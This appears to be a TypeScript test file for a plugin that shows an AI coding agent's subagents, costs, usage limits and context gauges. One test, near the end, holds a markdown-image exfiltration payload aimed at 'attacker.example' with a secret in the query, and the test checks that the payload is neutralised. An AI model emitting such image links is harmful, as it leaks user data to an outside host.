import { expect, test } from 'claude-code/testing'

import { bandSvg, costOf, ctxCells, ctxColor, ctxGaugeSvg, fmtAt, fmtCost, fmtIn, fmtElapsed, fmtPercent, fmtStart, fmtTokens, grouped, isStale, mascotSvg, mergeLive, modelLabel, limitRows, limitsHeading, newerReading, ordered, outfitFor, restore, windowOf, withoutImages, withStep } from './register'

const PANE = {
  component: 'Pane',
  requestId: 'agent-crew',
  props: {
    title: 'Agents',
    isFocused: false,
    bodyColumns: 60,
    placement: 'dock',
    scroll: { offset: 0, bodyRows: 30 },
    view: {},
  },
} as const

test('the pane shows the main agent on every surface', async ($, on) => {
  on('clock.now', () => ({ value: new Date(2026, 9, 15, 14, 31).getTime() }))
  for (const surface of ['terminal', 'desktop', 'vscode', 'mobile'] as const) {
    const ui = await $.ui.mount({ plugin: 'agent-crew', surface, ...PANE })
    expect(await ui.find({ type: 'Text', text: /Claude/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /idle/ })).toBeDefined()
    await ui.unmount()
  }
})

const BAND = {
  component: 'AbovePrompt',
  requestId: 'band',
  props: {
    hasSurvey: false,
    isWorking: false,
    maxRows: 10,
    bodyColumns: 80,
    scroll: { offset: 0, bodyRows: 10 },
    view: {},
  },
} as const

test('the band shows the crew and opens the pane on every surface', async ($, on) => {
  const opened: string[] = []
  on('ui.open', ($, e) => {
    opened.push(e.id)
    return { value: { isPlaced: true } }
  })
  for (const surface of ['terminal', 'desktop', 'vscode', 'mobile'] as const) {
    const ui = await $.ui.mount({ plugin: 'agent-crew', surface, ...BAND })
    expect(await ui.find(surface === 'terminal' ? { type: 'Text', text: /Agents 0\/1/ } : { type: 'Svg' })).toBeDefined()
    await ui.press({ key: 'crew-details' })
    expect(opened.at(-1)).toBe('agent-crew')
    await ui.unmount()
  }
})

test('outfits are stable per agent and the main agent wears the crown', async () => {
  expect(outfitFor('main').name).toBe('King')
  expect(outfitFor('agent-abc').name).toBe(outfitFor('agent-abc').name)
  expect(mascotSvg(outfitFor('x'), 'running')).toContain('animateTransform')
  expect(mascotSvg(outfitFor('x'), 'idle')).toContain('>z<')
})

test('cost, labels and formats', async () => {
  const none = { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }
  expect(costOf('claude-opus-5-5', { ...none, input: 1e6 })).toBe(4)
  expect(costOf('claude-opus-5-5', { ...none, cacheWrite: 1e6 })).toBe(5)
  expect(costOf('claude-haiku-5-5', { ...none, output: 1e6 })).toBe(0.5)
  expect(costOf('claude-sonnet-4-6', { ...none, cacheRead: 1e6 })).toBe(0.3)
  expect(costOf('mystery-model', { ...none, input: 1e6 })).toBe(0)
  expect(modelLabel('claude-opus-5-5')).toBe('Opus 5.5')
  expect(modelLabel('claude-haiku-4-5-20251001')).toBe('Haiku 4.5')
  expect(modelLabel('claude-opus-5[1m]')).toBe('Opus 5')
  expect(fmtElapsed(83_000)).toBe('1m 23s')
  expect(fmtTokens(1_000_000)).toBe('1M')
  expect(fmtTokens(261_200)).toBe('261k')
  expect(fmtPercent(261_200, 1_000_000)).toBe('26%')
  expect(fmtPercent(1_500, 1_000_000)).toBe('<1%')
  expect(fmtPercent(0, 1_000_000)).toBe('0%')
})

test('the history keeps every agent, oldest at the bottom', async () => {
  const live = [{ id: 'b', description: 'B', type: 'Explore', status: 'running' as const }]
  const past = [
    { id: 'a', name: 'A', type: 't', status: 'completed' as const, startedAt: 1, tokens: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, context: 0, cost: 0 },
    { id: 'c', name: 'C', type: 't', status: 'failed' as const, startedAt: 5, tokens: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, context: 0, cost: 0 },
  ]
  const merged = mergeLive(past, live, 10)
  expect(merged.map(m => m.id)).toEqual(['a', 'c', 'b'])
  const view = ordered(merged)
  expect(view.live.map(r => r.member.id)).toEqual(['b'])
  expect(view.past.map(m => m.id)).toEqual(['c', 'a'])
  expect(mergeLive(merged, [{ ...live[0]!, status: 'completed' }], 20).find(m => m.id === 'b')?.endedAt).toBe(20)
})

test('a resumed session gets its history back, the unfinished stopped', async () => {
  const at = { tokens: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, context: 0, cost: 0, type: 't' }
  const back = restore({
    savedAt: 50,
    agents: [
      { ...at, id: 'a', name: 'A', status: 'completed', startedAt: 1, endedAt: 9 },
      { ...at, id: 'b', name: 'B', status: 'running', startedAt: 2 },
      { ...at, id: 'c', name: 'C', status: 'idle', startedAt: 3 },
    ],
  })
  expect(back.map(m => [m.id, m.status, m.endedAt])).toEqual([
    ['a', 'completed', 9],
    ['b', 'killed', 50],
    ['c', 'completed', 50],
  ])
})

// $/MTok from platform.claude.com/docs/en/about-claude/pricing (2026-10-15):
// [model id, base input, 5m cache write, cache hit, output].
const LIST_PRICES: [string, number, number, number, number][] = [
  ['claude-fable-5-1', 10, 12.5, 0.25, 50],
  ['claude-mythos-5-1', 10, 12.5, 0.25, 50],
  ['claude-fable-5', 10, 12.5, 1, 50],
  ['claude-mythos-5', 10, 12.5, 1, 50],
  ['claude-opus-5-5', 4, 5, 0.2, 20],
  ['claude-opus-5', 5, 6.25, 0.5, 25],
  ['claude-opus-4-8', 5, 6.25, 0.5, 25],
  ['claude-opus-4-7', 5, 6.25, 0.5, 25],
  ['claude-opus-4-6', 5, 6.25, 0.5, 25],
  ['claude-opus-4-5-20251101', 5, 6.25, 0.5, 25],
  ['claude-opus-4-1-20250805', 15, 18.75, 1.5, 75],
  ['claude-opus-4-20250514', 15, 18.75, 1.5, 75],
  ['claude-opus-4-0', 15, 18.75, 1.5, 75],
  ['claude-sonnet-5-5', 2, 2.5, 0.1, 10],
  ['claude-sonnet-5', 2, 2.5, 0.2, 10],
  ['claude-sonnet-4-6', 3, 3.75, 0.3, 15],
  ['claude-sonnet-4-5-20250929', 3, 3.75, 0.3, 15],
  ['claude-sonnet-4-20250514', 3, 3.75, 0.3, 15],
  ['claude-haiku-5-5', 0.1, 0.125, 0.01, 0.5],
  ['claude-haiku-4-5-20251001', 1, 1.25, 0.1, 5],
  ['claude-3-5-haiku-20241022', 0.8, 1, 0.08, 4],
  // The same models under Bedrock's and Vertex's ids.
  ['us.anthropic.claude-opus-4-1-20250805-v1:0', 15, 18.75, 1.5, 75],
  ['claude-opus-4@20250514', 15, 18.75, 1.5, 75],
  ['claude-sonnet-4-5@20250929', 3, 3.75, 0.3, 15],
  ['claude-opus-5-5[1m]', 4, 5, 0.2, 20],
]
const NONE = { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }
// Dollars to the nano-dollar: float sums compare equal without a tolerance matcher.
const usd = (x: number) => Math.round(x * 1e9) / 1e9
// A per-kind count small enough to keep Haiku 5.5 in its up-to-100K tier: costs per 10K tokens.
const TEN_K = 10_000

test('every model is priced at its list price, kind by kind', async () => {
  for (const [model, input, cacheWrite, cacheRead, output] of LIST_PRICES) {
    expect([model, usd(costOf(model, { ...NONE, input: TEN_K }))]).toEqual([model, usd((input * TEN_K) / 1e6)])
    expect([model, usd(costOf(model, { ...NONE, cacheWrite: TEN_K }))]).toEqual([model, usd((cacheWrite * TEN_K) / 1e6)])
    expect([model, usd(costOf(model, { ...NONE, cacheRead: TEN_K }))]).toEqual([model, usd((cacheRead * TEN_K) / 1e6)])
    expect([model, usd(costOf(model, { ...NONE, output: TEN_K }))]).toEqual([model, usd((output * TEN_K) / 1e6)])
  }
})

test('a request sums its four kinds of tokens; an unknown model costs nothing', async () => {
  // Opus 5.5: 1K input × $4 + 3K written × $5 + 50K read × $0.20 + 2K output × $20.
  expect(usd(costOf('claude-opus-5-5', { input: 1_000, cacheWrite: 3_000, cacheRead: 50_000, output: 2_000 }))).toBe(usd(0.069))
  expect(costOf('gpt-mystery', { input: 1e6, cacheWrite: 1e6, cacheRead: 1e6, output: 1e6 })).toBe(0)
})

test('Haiku 5.5 bills a prompt over 100K tokens at its higher tier, the whole request', async () => {
  // The prompt counts input, cache reads and cache writes; output does not.
  const atLimit = { input: 40_000, cacheRead: 50_000, cacheWrite: 10_000, output: 1_000 }
  expect(usd(costOf('claude-haiku-5-5', atLimit))).toBe(usd((40_000 * 0.1 + 50_000 * 0.01 + 10_000 * 0.125 + 1_000 * 0.5) / 1e6))
  const over = { ...atLimit, input: 40_001 }
  expect(usd(costOf('claude-haiku-5-5', over))).toBe(usd((40_001 * 0.5 + 50_000 * 0.05 + 10_000 * 0.625 + 1_000 * 2.5) / 1e6))
  // Other models have no such tier.
  expect(usd(costOf('claude-haiku-4-5', over))).toBe(usd((40_001 * 1 + 50_000 * 0.1 + 10_000 * 1.25 + 1_000 * 5) / 1e6))
})

test('an agent adds up its requests: tokens and cost summed, context from the last one', async () => {
  const start = { id: 'a', name: 'A', type: 't', status: 'running' as const, startedAt: 0, tokens: NONE, context: 0, cost: 0 }
  const first = { input: 2_000, cacheWrite: 20_000, cacheRead: 0, output: 500 }
  const second = { input: 300, cacheWrite: 1_000, cacheRead: 22_000, output: 800 }
  const after = withStep(withStep(start, 'claude-sonnet-5-5', 'high', first), 'claude-sonnet-5-5', 'high', second)
  expect(after.tokens).toEqual({ input: 2_300, cacheWrite: 21_000, cacheRead: 22_000, output: 1_300 })
  expect(after.context).toBe(300 + 1_000 + 22_000 + 800)
  // Sonnet 5.5: $2 in, $2.50 written, $0.10 read, $10 out.
  expect(usd(after.cost)).toBe(usd((2_300 * 2 + 21_000 * 2.5 + 22_000 * 0.1 + 1_300 * 10) / 1e6))
  expect([after.model, after.effort]).toEqual(['claude-sonnet-5-5', 'high'])
  // A model switch prices each request at its own model.
  const switched = withStep(withStep(start, 'claude-opus-5-5', 'high', first), 'claude-haiku-4-5', 'low', first)
  expect(usd(switched.cost)).toBe(usd(costOf('claude-opus-5-5', first) + costOf('claude-haiku-4-5', first)))
})

test('context windows: 1M from the 4.6 models on, 200K before', async () => {
  for (const model of ['claude-opus-5-5', 'claude-opus-4-6', 'claude-sonnet-4-6', 'claude-haiku-5-5', 'claude-fable-5-1', 'claude-sonnet-4-5[1m]', undefined]) {
    expect([model, windowOf(model)]).toEqual([model, 1_000_000])
  }
  for (const model of ['claude-opus-4-5-20251101', 'claude-opus-4-1', 'claude-sonnet-4-5-20250929', 'claude-sonnet-4-20250514', 'claude-haiku-4-5-20251001', 'claude-3-5-haiku-20241022']) {
    expect([model, windowOf(model)]).toEqual([model, 200_000])
  }
})

test('costs are shown to the cent', async () => {
  expect(fmtCost(0)).toBe('<$0.01')
  expect(fmtCost(0.0099)).toBe('<$0.01')
  expect(fmtCost(0.01)).toBe('$0.01')
  expect(fmtCost(47.6)).toBe('$47.60')
  expect(fmtCost(3.275)).toMatch(/^\$3\.2[78]$/)
})

// Thursday 2026-10-15 14:31, local time.
const NOW = new Date(2026, 9, 15, 14, 31).getTime()
const iso = (ms: number) => new Date(ms).toISOString()
const MIN = 60_000

test('reset times read relative and local', async () => {
  expect([fmtIn(30_000), fmtIn(41 * MIN), fmtIn(134 * MIN), fmtIn(62 * MIN), fmtIn((3 * 24 + 4) * 60 * MIN)]).toEqual(['now', '41m', '2h 14m', '1h 02m', '3d 4h'])
  expect(fmtAt(NOW + 134 * MIN, NOW)).toBe('16:45')
  expect(fmtAt(new Date(2026, 9, 19, 9, 0).getTime(), NOW)).toBe('Mon 09:00')
})

test('the limits gauge: % used rounded down, gray then amber then red, the reset in the tooltip', async () => {
  const rows = limitRows(
    [
      { kind: 'five_hour', percentUsed: 34.2, resetsAt: iso(NOW + 134 * MIN) },
      { kind: 'seven_day', percentUsed: 89.9, resetsAt: iso(new Date(2026, 9, 19, 9, 0).getTime()) },
    ],
    NOW,
  )
  expect(rows.map(r => [r.label, r.text, r.color])).toEqual([
    ['5h', '34%', '#8a8a8a'],
    ['7d', '89%', '#D4A027'],
  ])
  expect(rows[0]?.tip).toBe('Current session (5h): 34.2% used · 65.8% left\n  resets in 2h 14m (16:45)')
  expect(rows[1]?.tip).toBe('Weekly (7d): 89.9% used · 10.1% left\n  resets in 3d 18h (Mon 09:00)')
  const at = (percentUsed: number) => limitRows([{ kind: 'five_hour', percentUsed, resetsAt: iso(NOW + MIN * 90) }], NOW)[0]
  expect([at(74.9)?.color, at(75)?.color, at(90)?.color, at(100)?.color]).toEqual(['#8a8a8a', '#D4A027', '#E5484D', '#E5484D'])
  expect([at(99.9)?.text, at(100)?.text, at(100)?.tip]).toEqual(['99%', '100%', 'Current session (5h): limit reached · resets in 1h 30m (16:01)'])
})

test('the limits gauge: nothing off a subscription, a placeholder for a missing window, a dash once reset', async () => {
  expect(limitRows(undefined, NOW)).toEqual([])
  expect(limitRows([], NOW)).toEqual([])
  expect(limitRows([{ kind: 'spend_limit', percentUsed: 10 }], NOW)).toEqual([])
  const onlyWeek = limitRows([{ kind: 'seven_day', percentUsed: 12, resetsAt: iso(NOW + 49 * 60 * MIN) }], NOW)
  expect(onlyWeek.map(r => [r.label, r.text, r.isMissing ?? false])).toEqual([
    ['5h', '—', true],
    ['7d', '12%', false],
  ])
  const reset = limitRows([{ kind: 'five_hour', percentUsed: 97, resetsAt: iso(NOW - MIN) }], NOW)[0]
  expect([reset?.text, reset?.used, reset?.tip]).toEqual(['—', undefined, 'Current session (5h): reset at 14:30, waiting for a new reading'])
})

test('the band makes room for the gauge on its left, and draws none without limits', async () => {
  const king = { id: 'main', name: 'main', type: 'agent', status: 'idle' as const, startedAt: 0, tokens: NONE, context: 0, cost: 0 }
  const without = bandSvg([king], 0, 1)
  const rows = limitRows([{ kind: 'five_hour', percentUsed: 24, resetsAt: iso(NOW + MIN * 60) }], NOW)
  const withLimits = bandSvg([king], 0, 1, rows)
  expect(withLimits.width - without.width).toBe(84)
  expect(withLimits.source).toContain('>5h<')
  expect(withLimits.source).toContain('translate(84 0)')
  expect(without.source).not.toContain('>5h<')
  expect(without.source).toContain('translate(0 0)')
})

test('the limits shown are the latest reading of any session, and say their age once it is old', async () => {
  const limits = [{ kind: 'five_hour', percentUsed: 30 }]
  // Nothing shown yet: any reading will do; then only a newer one.
  expect(newerReading({}, { at: 5, limits })).toEqual({ at: 5, limits })
  expect(newerReading({ limitsAt: 10 }, { at: 5, limits })).toBeUndefined()
  expect(newerReading({ limitsAt: 10 }, { at: 11, limits })).toEqual({ at: 11, limits })
  // Whatever else sits in the store is no reading.
  for (const junk of [undefined, null, 'x', { at: 11 }, { at: '11', limits }, { at: 11, limits: [] }]) {
    expect(newerReading({ limitsAt: 10 }, junk)).toBeUndefined()
  }
  expect(limitsHeading(NOW - 4 * MIN, NOW)).toBe('Claude usage limits')
  expect(limitsHeading(NOW - 20 * MIN, NOW)).toBe('Claude usage limits · as of 14:11')
  expect(limitsHeading(undefined, NOW)).toBe('Claude usage limits')
})

test('the pane\'s numbers: start, duration, cost and context in short fixed formats', async () => {
  // Today needs no date; any other day gets the user's YY-MM-DD, never less than the minute.
  expect(fmtStart(new Date(2026, 9, 15, 16, 18, 3).getTime(), NOW)).toBe('16:18')
  expect(fmtStart(new Date(2026, 9, 14, 16, 40, 55).getTime(), NOW)).toBe('26-10-14 16:40')
  expect(fmtStart(new Date(2025, 0, 2, 9, 5).getTime(), NOW)).toBe('25-01-02 09:05')
  expect([fmtElapsed(41_000), fmtElapsed(185_000), fmtElapsed(72 * MIN), fmtElapsed((27 * 60 + 5) * MIN)]).toEqual(['41s', '3m 05s', '1h 12m', '1d 03h'])
  expect([fmtCost(0.004), fmtCost(0.42), fmtCost(99.994), fmtCost(99.996), fmtCost(123.4)]).toEqual(['<$0.01', '$0.42', '$99.99', '$100', '$123'])
  expect(grouped(48_213)).toBe('48,213')
  expect(grouped(1_000_000)).toBe('1,000,000')
  expect(grouped(999)).toBe('999')
})

test('the context gauge: gray, amber from 70%, red from 90%, five cells in a terminal', async () => {
  expect([ctxColor(69.9), ctxColor(70), ctxColor(89.9), ctxColor(90)]).toEqual(['#8E8E8E', '#D9A21B', '#D9A21B', '#D0453A'])
  expect([ctxCells(0), ctxCells(26), ctxCells(50), ctxCells(100), ctxCells(140)]).toEqual(['▱▱▱▱▱', '▰▱▱▱▱', '▰▰▰▱▱', '▰▰▰▰▰', '▰▰▰▰▰'])
  expect(ctxGaugeSvg(0, 'empty')).not.toContain('width="2"')
  expect(ctxGaugeSvg(0.1, 'tiny')).toContain('width="2"')
  expect(ctxGaugeSvg(50, 'half')).toContain('width="18" height="5" rx="2" fill="#8E8E8E"')
  expect(ctxGaugeSvg(95, 'full <x>')).toContain('fill="#D0453A"')
})

test('a report draws no image: each one turns into a plain link, the text otherwise untouched', async () => {
  const injected = 'Done. ![status](https://attacker.example/p.png?d=SECRET) and ![ref][1]\n\n[1]: https://attacker.example/q.png'
  const safe = withoutImages(injected)
  expect(safe).not.toContain('![')
  expect(safe.replace(/\u200b/g, '')).toBe(injected)
  expect(withoutImages('No image, a [link](https://example.com) and a `code` span!')).toBe('No image, a [link](https://example.com) and a `code` span!')
})

test('a history older than 30 days is stale, like Claude Code\'s own transcripts', async () => {
  const DAY = 86_400_000
  expect(isStale({ savedAt: NOW - 29 * DAY, agents: [] }, NOW)).toBe(false)
  expect(isStale({ savedAt: NOW - 31 * DAY, agents: [] }, NOW)).toBe(true)
  // Whatever else sits under a history key goes too.
  for (const junk of [undefined, null, 'x', {}, { savedAt: 'yesterday' }]) expect(isStale(junk, NOW)).toBe(true)
})
